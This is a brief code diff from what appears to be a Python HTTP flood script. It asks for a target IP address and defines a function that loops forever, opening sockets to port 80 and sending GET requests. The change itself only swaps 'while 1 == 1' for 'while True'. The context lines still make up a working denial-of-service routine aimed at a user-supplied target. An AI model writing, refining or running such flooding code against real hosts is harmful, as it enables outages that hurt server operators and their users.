@@ -6,7 +6,7 @@ target = input("Type here the target ip: ")
 x = "182.21.20.32"
 port = 80
 def http_f():
-    while 1 == 1:
+    while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
